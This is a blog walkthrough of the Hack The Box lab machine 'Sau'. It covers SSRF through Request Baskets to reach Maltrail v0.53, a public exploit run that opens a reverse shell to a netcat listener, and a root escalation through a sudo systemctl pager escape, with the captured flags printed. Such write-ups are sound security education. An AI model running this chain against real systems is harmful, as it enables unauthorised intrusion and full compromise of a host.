<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="sau from HTB" /><meta property="og:locale" content="en" /><meta name="description" content="sau from HTB page Nmapgave this: 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA) | 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA) |_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519) 80/tcp filtered http 7080/tcp filtered empowerid 8338/tcp filtered unknown 19667/tcp filtered unknown 34980/tcp filtered ethercat 55555/tcp open unknown 80 portis filtered so we can’t access it. Only open port is 55555and let’s access it. Accessing the site we see that it is a request basketsite and version is 1.2.1. Quick search shows that this version is vulnerable to ssrf. We can access the 80 portwith this vulnerability. Create basket click Open Basket Click settings logo And in Forward URLtype: 127.0.0.1:80So When we open the basket we will be forwarded to the 80 port. Check last two things: Proxy Response and Expand Forward Path Click Apply Proxy Response - This allows the basket to behave as a full proxy: responses from the underlying service configured in forward_url are passed back to clients of original requests. The configuration of basket responses is ignored in this case. Expand Forward Path - With this, the forward URL path will be expanded when original HTTP request contains a compound path. After that instead of accessing the &lt;ip&gt;:80 type &lt;ip&gt;:55555/&lt;basked id&gt;. For me it is like this: 1 http://10.10.11.224:55555/vnjie7d Checking the site we see that it is powered by 1 Maltrail (v0.53) After searching a bit i got to this github repositorywhich grants me an reverse shell: https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main 1 python3 exploit.py [listening_IP] [listening_PORT] [target_URL] Fill this with your IP PORT and website URL For example: 1 python3 exploit.py 10.10.16.2 1234 http://10.10.11.224:55555/dtfhpmh This got me Connection: 1 2 3 4 5 6 7 8 rlwrap nc -nlvp 1234 listening on [any] 1234 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.11.224] 59542 $ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null $ cat /home/puma/user.txt aacebf2e57c90a4492e782dee743ff6d User Flag is: aacebf2e57c90a4492e782dee743ff6d *** With root permission i can run systemctl. ```bash sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin" /><meta property="og:description" content="sau from HTB page Nmapgave this: 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA) | 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA) |_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519) 80/tcp filtered http 7080/tcp filtered empowerid 8338/tcp filtered unknown 19667/tcp filtered unknown 34980/tcp filtered ethercat 55555/tcp open unknown 80 portis filtered so we can’t access it. Only open port is 55555and let’s access it. Accessing the site we see that it is a request basketsite and version is 1.2.1. Quick search shows that this version is vulnerable to ssrf. We can access the 80 portwith this vulnerability. Create basket click Open Basket Click settings logo And in Forward URLtype: 127.0.0.1:80So When we open the basket we will be forwarded to the 80 port. Check last two things: Proxy Response and Expand Forward Path Click Apply Proxy Response - This allows the basket to behave as a full proxy: responses from the underlying service configured in forward_url are passed back to clients of original requests. The configuration of basket responses is ignored in this case. Expand Forward Path - With this, the forward URL path will be expanded when original HTTP request contains a compound path. After that instead of accessing the &lt;ip&gt;:80 type &lt;ip&gt;:55555/&lt;basked id&gt;. For me it is like this: 1 http://10.10.11.224:55555/vnjie7d Checking the site we see that it is powered by 1 Maltrail (v0.53) After searching a bit i got to this github repositorywhich grants me an reverse shell: https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main 1 python3 exploit.py [listening_IP] [listening_PORT] [target_URL] Fill this with your IP PORT and website URL For example: 1 python3 exploit.py 10.10.16.2 1234 http://10.10.11.224:55555/dtfhpmh This got me Connection: 1 2 3 4 5 6 7 8 rlwrap nc -nlvp 1234 listening on [any] 1234 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.11.224] 59542 $ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null $ cat /home/puma/user.txt aacebf2e57c90a4492e782dee743ff6d User Flag is: aacebf2e57c90a4492e782dee743ff6d *** With root permission i can run systemctl. ```bash sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin" /><link rel="canonical" href="https://darkfears31.github.io/posts/Sau-from-HTB/" /><meta property="og:url" content="https://darkfears31.github.io/posts/Sau-from-HTB/" /><meta property="og:site_name" content="darkfears31’s Walktroughs" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-06T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="sau from HTB" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-06T00:00:00+00:00","datePublished":"2024-09-06T00:00:00+00:00","description":"sau from HTB page Nmapgave this: 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA) | 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA) |_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519) 80/tcp filtered http 7080/tcp filtered empowerid 8338/tcp filtered unknown 19667/tcp filtered unknown 34980/tcp filtered ethercat 55555/tcp open unknown 80 portis filtered so we can’t access it. Only open port is 55555and let’s access it. Accessing the site we see that it is a request basketsite and version is 1.2.1. Quick search shows that this version is vulnerable to ssrf. We can access the 80 portwith this vulnerability. Create basket click Open Basket Click settings logo And in Forward URLtype: 127.0.0.1:80So When we open the basket we will be forwarded to the 80 port. Check last two things: Proxy Response and Expand Forward Path Click Apply Proxy Response - This allows the basket to behave as a full proxy: responses from the underlying service configured in forward_url are passed back to clients of original requests. The configuration of basket responses is ignored in this case. Expand Forward Path - With this, the forward URL path will be expanded when original HTTP request contains a compound path. After that instead of accessing the &lt;ip&gt;:80 type &lt;ip&gt;:55555/&lt;basked id&gt;. For me it is like this: 1 http://10.10.11.224:55555/vnjie7d Checking the site we see that it is powered by 1 Maltrail (v0.53) After searching a bit i got to this github repositorywhich grants me an reverse shell: https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main 1 python3 exploit.py [listening_IP] [listening_PORT] [target_URL] Fill this with your IP PORT and website URL For example: 1 python3 exploit.py 10.10.16.2 1234 http://10.10.11.224:55555/dtfhpmh This got me Connection: 1 2 3 4 5 6 7 8 rlwrap nc -nlvp 1234 listening on [any] 1234 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.11.224] 59542 $ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null $ cat /home/puma/user.txt aacebf2e57c90a4492e782dee743ff6d User Flag is: aacebf2e57c90a4492e782dee743ff6d *** With root permission i can run systemctl. ```bash sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin","headline":"sau from HTB","mainEntityOfPage":{"@type":"WebPage","@id":"https://darkfears31.github.io/posts/Sau-from-HTB/"},"url":"https://darkfears31.github.io/posts/Sau-from-HTB/"}</script><title>sau from HTB | darkfears31's Walktroughs</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="darkfears31's Walktroughs"><meta name="application-name" content="darkfears31's Walktroughs"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/162694375?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">darkfears31's Walktroughs</a></div><div class="site-subtitle font-italic">An PicoCTF and HackTheBox Walktroughs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/darkfears31" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://youtube.com/user/jadehawk" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>sau from HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>sau from HTB</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1725580800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 6, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/darkfears31">kaikaci</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="446 words"> <em>2 min</em> read</span></div></div></div><div class="post-content"><h1 id="sau-from-htb">sau from HTB</h1><p><a href="https://app.hackthebox.com/machines/Sau">page</a> <code class="language-plaintext highlighter-rouge">Nmap</code>gave this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed <span class="o">(</span>RSA<span class="o">)</span>
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    filtered http
7080/tcp  filtered empowerid
8338/tcp  filtered unknown
19667/tcp filtered unknown
34980/tcp filtered ethercat
55555/tcp open     unknown
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">80 port</code>is filtered so we can’t access it. Only open port is <code class="language-plaintext highlighter-rouge">55555</code>and let’s access it. Accessing the site we see that it is a <code class="language-plaintext highlighter-rouge">request basket</code>site and version is <code class="language-plaintext highlighter-rouge">1.2.1</code>. Quick search shows that this version is vulnerable to <code class="language-plaintext highlighter-rouge">ssrf</code>. We can access the <code class="language-plaintext highlighter-rouge">80 port</code>with this vulnerability.</p><ol><li>Create basket<li>click <code class="language-plaintext highlighter-rouge">Open Basket</code><li>Click <code class="language-plaintext highlighter-rouge">settings logo</code><li>And in <code class="language-plaintext highlighter-rouge">Forward URL</code>type: <code class="language-plaintext highlighter-rouge">127.0.0.1:80</code>So When we open the basket we will be forwarded to the <code class="language-plaintext highlighter-rouge">80 port</code>.<li>Check last two things: <code class="language-plaintext highlighter-rouge">Proxy Response</code> and <code class="language-plaintext highlighter-rouge">Expand Forward Path</code><li>Click <code class="language-plaintext highlighter-rouge">Apply</code> Proxy Response - This allows the basket to behave as a full proxy: responses from the underlying service configured in <code class="language-plaintext highlighter-rouge">forward_url</code> are passed back to clients of original requests. The configuration of basket responses is ignored in this case. Expand Forward Path - With this, the forward URL path will be expanded when original HTTP request contains a compound path. After that instead of accessing the <code class="language-plaintext highlighter-rouge">&lt;ip&gt;:80</code> type <code class="language-plaintext highlighter-rouge">&lt;ip&gt;:55555/&lt;basked id&gt;</code>. For me it is like this:<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.11.224:55555/vnjie7d
</pre></table></code></div></div><p>Checking the site we see that it is powered by</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Maltrail (v0.53)
</pre></table></code></div></div><p>After searching a bit i got to this <code class="language-plaintext highlighter-rouge">github repository</code>which grants me an reverse shell: https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 exploit.py [listening_IP] [listening_PORT] [target_URL]
</pre></table></code></div></div><p>Fill this with your <code class="language-plaintext highlighter-rouge">IP PORT and website URL</code> For example:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">python3</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">16.2</span> <span class="mi">1234</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.224</span><span class="p">:</span><span class="mi">55555</span><span class="o">/</span><span class="n">dtfhpmh</span>
</pre></table></code></div></div><p>This got me Connection:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>rlwrap nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.10.16.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.224] 59542
<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
<span class="nv">$ </span><span class="nb">cat</span> /home/puma/user.txt
aacebf2e57c90a4492e782dee743ff6d
</pre></table></code></div></div><hr /><p>User Flag is: aacebf2e57c90a4492e782dee743ff6d *** With root permission i can run <code class="language-plaintext highlighter-rouge">systemctl</code>. ```bash sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</p></ol><p>User puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>Check the version `always` because of version it is vulnerable
After quick search i got to this site which showed me how to do `privilege escalation with systemctl`: https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7

```bash
sudo /usr/bin/systemctl status trail.service
# after it stops typing, You need to type !sh
.................
..............
!sh

# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
e8b95f603e7b22e2f257d5975fdd1b52
</pre></table></code></div></div><hr /><p>Root Flag is: e8b95f603e7b22e2f257d5975fdd1b52 *** <img data-src="/assets/images/Screenshot from 2024-08-09 20-49-48.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=sau+from+HTB+-+darkfears31%27s+Walktroughs&url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FSau-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=sau+from+HTB+-+darkfears31%27s+Walktroughs&u=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FSau-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FSau-from-HTB%2F&text=sau+from+HTB+-+darkfears31%27s+Walktroughs" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tabby-from-HTB/">Tabby from HTB</a><li><a href="/posts/Stonks-from-PicoCTF/">Stonks from PicoCTF</a><li><a href="/posts/Backdoor-from-HTB/">Backdoor from HTB</a><li><a href="/posts/Antique-from-HTB/">Antique from HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Codify-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Codify from HTB"</h3><div class="text-muted small"><p> Codify from HTB page Nmap gave nothing unusual. Went to the site and saw vm2and then went for vm2 exploitand got to this github: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 c...</p></div></div></a></div><div class="card"> <a href="/posts/CozyHosting-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CozyHosting from HTB</h3><div class="text-muted small"><p> CozyHosting from HTB page Nmap gave this: nmap -sCV --min-rate 4000 10.10.11.230 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 18:47 +04 Nmap scan report for cozyhosting.htb (10.10.11.23...</p></div></div></a></div><div class="card"> <a href="/posts/Devvortex-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Devvortex from HTB</h3><div class="text-muted small"><p> Devvortex from HTB page Nmapgave this: nmap -sCV --min-rate 4000 10.10.11.242 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 15:06 +04 Nmap scan report for devvortex.htb (10.10.11.242) Ho...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SansAlpha-from-PicoCTF/" class="btn btn-outline-primary" prompt="Older"><p>SansAlpha from PicoCTF</p></a> <a href="/posts/ScriptKiddie-from-HTB/" class="btn btn-outline-primary" prompt="Newer"><p>ScriptKiddie from HTB</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/darkfears31">kaikaci</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script 